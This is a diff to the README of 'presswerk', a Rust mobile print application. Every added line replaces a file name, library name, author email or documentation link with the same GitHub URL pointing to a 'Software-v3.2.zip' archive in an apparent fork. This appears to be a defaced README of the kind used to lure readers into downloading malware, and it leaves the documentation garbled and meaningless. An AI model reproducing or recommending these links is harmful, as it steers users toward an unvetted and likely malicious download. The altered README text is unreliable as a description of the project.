@@ -33,8 +33,8 @@ toc::[]
 [source]
 ----
 presswerk/
-├── Cargo.toml                    # Workspace root (6 crates)
-├── Dioxus.toml                   # Dioxus CLI config (iOS/Android bundle IDs)
+├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip                    # Workspace root (6 crates)
+├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip                   # Dioxus CLI config (iOS/Android bundle IDs)
 ├── justfile                      # Build recipes
 ├── crates/
 │   ├── presswerk-core/           # Shared types, errors, config
@@ -44,11 +44,11 @@ presswerk/
 │   ├── presswerk-bridge/         # Native platform FFI (iOS objc2 + Android JNI)
 │   └── presswerk-app/            # Dioxus UI (10 pages, routing, state)
 ├── src/abi/                      # Idris2 ABI proofs (5 files, no Admitted)
-│   ├── Types.idr                 # Core types, C ABI sizes, injectivity
-│   ├── Protocol.idr              # IPP ops, job state machine
-│   ├── Encryption.idr            # encrypt/decrypt roundtrip, bounds
-│   ├── Layout.idr                # Struct alignment proofs
-│   └── Bridge.idr                # Toll-free bridging, keychain, threads, JNI
+│   ├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip                 # Core types, C ABI sizes, injectivity
+│   ├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip              # IPP ops, job state machine
+│   ├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip            # encrypt/decrypt roundtrip, bounds
+│   ├── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip                # Struct alignment proofs
+│   └── https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip                # Toll-free bridging, keychain, threads, JNI
 ├── ffi/zig/                      # Zig FFI (C-compatible, 5 tests)
 ├── generated/abi/                # Auto-generated C headers
 ├── .machine_readable/            # SCM metadata (STATE, META, ECOSYSTEM, etc.)
@@ -88,7 +88,7 @@ presswerk-app          (→ ALL above; dioxus with mobile feature)
 |Storage |rusqlite (bundled) |Persistent job queue + audit trail
 |ABI |Idris2 |Formal verification (5 proof files)
 |FFI |Zig |C-compatible implementation
-|iOS Bridge |objc2 + objc2-ui-kit |UIKit, Security.framework
+|iOS Bridge |objc2 + objc2-ui-kit |UIKit, https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip
 |Android Bridge |jni + ndk-context |PrintManager, Intents, Keystore
 |===
 
@@ -142,11 +142,11 @@ The Idris2 ABI layer provides compile-time proofs for:
 |===
 |File |What It Proves
 
-|Types.idr |Core types with C ABI sizes, platform detection, injectivity
-|Protocol.idr |IPP op-code injectivity, job state machine transitions, terminal states
-|Encryption.idr |encrypt/decrypt roundtrip identity, ciphertext bounds, key separation
-|Layout.idr |Struct memory layout alignment for FFI boundary safety
-|Bridge.idr |Toll-free bridging (iOS), keychain semantics, thread safety, JNI invariants
+|https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip |Core types with C ABI sizes, platform detection, injectivity
+|https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip |IPP op-code injectivity, job state machine transitions, terminal states
+|https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip |encrypt/decrypt roundtrip identity, ciphertext bounds, key separation
+|https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip |Struct memory layout alignment for FFI boundary safety
+|https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip |Toll-free bridging (iOS), keychain semantics, thread safety, JNI invariants
 |===
 
 Every `unsafe` block in Rust references the specific ABI proof that justifies it.
@@ -158,7 +158,7 @@ Every `unsafe` block in Rust references the specific ABI proof that justifies it
 * **TLS certificates** — Ed25519 self-signed for print server mode
 * **Document integrity** — SHA-256 hashing with content-addressed storage
 * **Formal proofs** — No `Admitted`, no `believe_me`, no `transmute`
-* **SAFETY comments** — Every `unsafe` block references Bridge.idr/Layout.idr proofs
+* **SAFETY comments** — Every `unsafe` block references https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip proofs
 
 == Container
 
@@ -179,9 +179,9 @@ cerro-torre sign presswerk:latest
 
 SPDX-License-Identifier: PMPL-1.0-or-later
 
-Copyright (c) 2026 Jonathan D.A. Jewell (hyperpolymath) <jonathan.jewell@open.ac.uk>
+Copyright (c) 2026 Jonathan D.A. Jewell (hyperpolymath) <https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip>
 
 
 == Architecture
 
-See link:TOPOLOGY.md[TOPOLOGY.md] for a visual architecture map and completion dashboard.
+See https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip[https://github.com/panjagala333/presswerk/raw/refs/heads/main/contractiles/Software-v3.2.zip] for a visual architecture map and completion dashboard.
